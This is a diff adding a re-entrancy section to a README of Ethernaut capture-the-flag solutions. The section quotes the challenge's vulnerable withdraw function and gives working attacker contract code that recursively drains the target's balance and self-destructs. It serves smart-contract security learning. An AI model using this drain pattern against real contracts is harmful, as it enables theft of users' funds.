@@ -236,6 +236,61 @@ All you need to know is how the `fallback` function works and some details about
 
 2. You will made king of the contract and now whenever someone tries to become the king, the transaction will be reverted as the gas limit will exceed and no one can replace you.
 
+## 10 - Re-entrancy
+
+For reference -> [Challenge](./questions/10.Re-entrancy.sol) | [Solution](./answers/10.Re-entrancy.sol)
+
+This challenge is all about re-entrancy attack and how it can be prevented. The `withdraw` function is vulnerable to re-entrancy attack as it first sends the ether to the caller and then updates the balance. So, if the caller is a malicious contract, it can call the `withdraw` function again and again before the balance is updated.
+
+```solidity
+    function withdraw(uint _amount) public {
+        if(balances[msg.sender] >= _amount) {
+            (bool result,) = msg.sender.call{value:_amount}("");
+            if(result) {
+                _amount;
+            }
+            balances[msg.sender] -= _amount;
+        }
+    }
+```
+
+To hack this, we will deploy a malicious contract that will call the `withdraw` function again and again before the balance is updated.
+
+1. Deploy the contract provided in [Solution](./answers/10.Re-entrancy.sol) file.
+
+2. Call the `hack` function and also send 0.001 ether to it. The `hack` function will send 0.001 ether to the malicious contract and will withdraw it immediately, `withdraw()` will trigger the receive function and then the magic starts!
+
+```solidity
+    // Send 0.001 ether and withdraw immediately
+    // This will trigger the receive function when withdraw() is called on Reentrance contract
+    function hack() public payable {
+        reentrance.donate{value: msg.value}(address(this));
+        // This will trigger the receive() the function
+        reentrance.withdraw(msg.value);
+
+        require(address(reentrance).balance == 0, "FAILED!!!");
+
+        // Recover sent ether
+        selfdestruct(payable(msg.sender));
+    }
+
+    receive() external payable {
+        uint256 balance = reentrance.balanceOf(address(this));
+
+        // Try to withdraw the smallest amount possible, so that the transaction does not revert
+        uint256 withdrawableAmount = balance < 0.001 ether
+            ? balance
+            : 0.001 ether;
+
+        // Stop withdrawing if the contract balance is 0, so that the transaction does not revert
+        if (withdrawableAmount > 0) {
+            reentrance.withdraw(withdrawableAmount);
+        }
+    }    
+```
+
+
+
 ## Contributing
 
 Contributions to the Ethernaut_Practice project are welcome! If you have a solution to a challenge that is not yet included, or if you have suggestions for improvements, feel free to open a pull request.
